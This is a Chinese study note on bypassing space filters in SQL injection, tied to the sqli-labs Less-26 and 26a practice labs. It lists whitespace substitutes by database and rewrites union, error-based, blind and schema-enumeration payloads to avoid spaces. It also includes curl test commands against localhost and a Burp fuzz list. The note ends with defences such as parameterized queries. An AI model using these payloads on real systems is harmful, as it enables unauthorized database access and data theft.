# 05-过滤空格

> 前置：[[../03-报错注入|报错注入]]（本场景 payload 骨架来自报错/联合查询）
>
> sqli-labs 对照：less-26、less-26a（过滤 or/and + 空格）

## 一、场景描述

服务端对输入做黑名单过滤，空格是最常见的被禁字符之一：

```php
// 典型过滤（less-26 原型）
$id = $_GET['id'];
$id = preg_replace('/[\/\*]/', '', $id);        // 注释符
$id = preg_replace('/[--]/', '', $id);          // 连字符
$id = preg_replace('/[#]/', '', $id);           // #
$id = preg_replace('/\s/', '', $id);            // 空白字符 ← 本章主角
$id = preg_replace('/or/i', '', $id);
$id = preg_replace('/and/i', '', $id);
```

空格被过滤后，`union select`、`order by`、`and 1=1` 这些含空格的骨架全部失效，必须用等价写法替代。

### 先判断过滤类型

| 探测输入 | 现象 | 过滤类型 |
|---------|------|---------|
| `1 union select 1,2,3` | 页面正常但无注入效果，去掉空格的 payload 生效 | 删除型（`\s` 替换为空） |
| `1%20union...` 直接 403/拦截页 | 拦截型（WAF 层） |
| `%09` 版 payload 生效而空格版被拦 | 只拦了字面空格，未归一化编码 |

判断方法决定方案选择：删除型可用双写/嵌套（如 `/**/` 内含被删字符），拦截型优先考虑编码变形。

## 二、替代方案大表

| 方案 | 写法示例 | 说明 | 兼容性备注 |
|------|---------|------|-----------|
| 内联注释 `/**/` | `union/**/select/**/1,2,3` | 最常用；可嵌内容 `un/**/ion` 拆关键字 | MySQL 支持；**Oracle 中 `/**/` 同样可用** |
| 括号包裹 `()` | `and(extractvalue(1,concat(0x7e,database())))` | 函数调用天然不需要空格；比较也可括号化 | 全数据库通用 |
| `%09` Tab | `union%09select` | URL 编码后由服务器还原为制表符 | MySQL 视为空白分隔符 |
| `%0a` LF / `%0b` VT / `%0c` FF / `%0d` CR | `and%0aextractvalue(...)` | 各类换行/垂直空白 | MySQL 均接受；WAF 常漏掉 %0b %0c |
| `+` 号 | `?id=1+union+select` | URL 中 `+` 解析为空格（仅 query string） | **仅 GET 参数有效**；POST body 中 `+` 是字面加号 |
| 双空格/多空白变体 | `%20%20` | 对"替换一次"型过滤有效 | 对 `\s+` 正则删除型无效 |
| 编码组合 | `%2f%2a%2f`（URL 编码的 `/**/`） | WAF 解码层数不足时生效 | 取决于 WAF 是否二次解码 |
| 反引号包裹别名 | ``select`id`from`users`` | 列名/表名位置的反引号可当分隔符 | 仅 MySQL |
| 括号代替 from 空格 | `(select(1))` | 子查询内层压缩 | MySQL |

### 各数据库空白字符兼容速查

| 字符 | MySQL | PostgreSQL | MSSQL | Oracle |
|------|-------|-----------|-------|--------|
| `%09` Tab | 是 | 是 | 是 | 否 |
| `%0a` LF | 是 | 是 | 是 | 部分 |
| `%0c` FF | 是 | 否 | 是 | 否 |
| `/**/` | 是 | 是 | 是（部分版本） | 是 |
| `+` | 否 | 否 | **是** | 否 |

MSSQL 特有：`+` 即空格；Oracle 基本只能靠 `/**/`。CTF 主战场仍是 MySQL，此表用于跨库题目参考。

## 三、payload 改写对比

### 联合查询

```sql
-- 原版
-1' union select 1,2,3#
-- 绕过版
-1'/**/union/**/select/**/1,2,3#
-1'%09union%09select%091,2,3#
```

### 报错注入

```sql
-- 原版
' and extractvalue(1,concat(0x7e,database()))#
-- 绕过版（括号方案，零空格）
'and(extractvalue(1,concat(0x7e,database())))#
-- 绕过版（注释方案）
'/**/and/**/extractvalue(1,concat(0x7e,database()))#
```

### order by 探测列数

```sql
-- 原版
1'order by 3#
-- 绕过版
1'order/**/by/**/3#
1'%0aorder%09by%0a3#
```

### information_schema 查询

```sql
-- 原版
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
-- 绕过版
-1'/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
```

### 布尔盲注

```sql
-- 原版
' and ascii(substr(database(),1,1))>100 and '1'='1
-- 绕过版（零空格）
'and(ascii(substr(database(),1,1))>100)and'1
```

### 实测命令

```bash
# less-26: 过滤 or/and + 空格，双引号或单引号+括号闭合
curl -s "http://127.0.0.1/sqli-labs/Less-26/?id=1'%0a||%0aupdatexml(1,concat(0x7e,database()),1)||%0a'1"
# || 替代 or（见 [[06-AND_OR注入]]），%0a 替代空格

# less-26a 数字型闭合版本
curl -s "http://127.0.0.1/sqli-labs/Less-26a/?id=1')%0a||%0a'1"
```

## 四、组合与优先级策略

实际打过滤站点时的选择顺序：

```mermaid
flowchart TD
    A[空格被过滤?] --> B{过滤方式?}
    B -->|正则删除 \s| C["/**/ 或 () 或 %09~%0d"]
    B -->|拦截含空格请求| D["+ 号 / 编码绕过"]
    C --> E{还有其他过滤?}
    D --> E
    E -->|and/or 也被拦| F[配合 && / \|\| 变形]
    E -->|注释符也被拦| G[纯括号方案 + 引号自闭合]
    F --> H[payload 定稿]
    G --> H
```

要点：

1. `/**/` 最省事但常与空格一起进黑名单，先试
2. 括号方案最通用——所有函数调用写法都能做到完全无空格
3. `%09/%0a/%0b/%0c/%0d` 在 Burp 的 Intruder 里逐个 fuzz 最快
4. 多重过滤时把各方案叠加：`%0a/**/%09` 这类混合体有时反而能过

### Burp Intrucer 空白字符字典

```
%09   %0a   %0b   %0c   %0d   %20   %2b   %a0
```

（`%a0` 在 Apache 老版本 + Windows 环境会被当作不换行空格处理，是经典组合漏洞点）

### 完全无空格的极限写法

当所有空白与注释都被禁时，靠括号和引号也能拼出可用语句：

```sql
-- 无任何空格的报错注入
'and(extractvalue(1,concat(0x7e,database())))and'1
-- union 版需要列间分隔符，用 %0a 或把列放进函数:
'union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),3)#
```

第二条展示了**from/where 全部括号化**的写法——MySQL 中 `from(表)`、`where(条件)` 的括号形式是合法语法。

## 五、易错点

| 易错点 | 说明 |
|-------|------|
| `+` 用在 POST 里失效 | `+` 只在 GET query string 被解析为空格，body 里要用 `%20` 或注释 |
| `/**` 不配对导致语法错误 | 注释必须完整 `/**/`，且部分 WAF 会剥一层注释 |
| `%0b` 在某些中间件被丢弃 | Tomcat/Nginx 组合可能规范化垂直制表符，先验证再批量用 |
| 双写不适用于删除型过滤 | 双写（如 `uni unionon`）针对的是"替换一次"过滤；`\s+` 全删型要换方案 |
| 括号方案在 order by 失效 | 排序位置不能整体括号化，只能靠注释/编码替代空格 |

## 六、防御视角

| 措施 | 说明 |
|------|------|
| 参数化查询 | 根治。空格过滤本质是在补拼接的锅 |
| 黑名单过滤注定漏 | `\s` 删得掉空格删不掉语义等价物，黑名单永远追不完 |
| 白名单校验参数格式 | id 强制整数、排序字段走映射表 |
| WAF 层注意解码顺序 | 对 %09~%0d 与多级编码统一归一化后再匹配 |
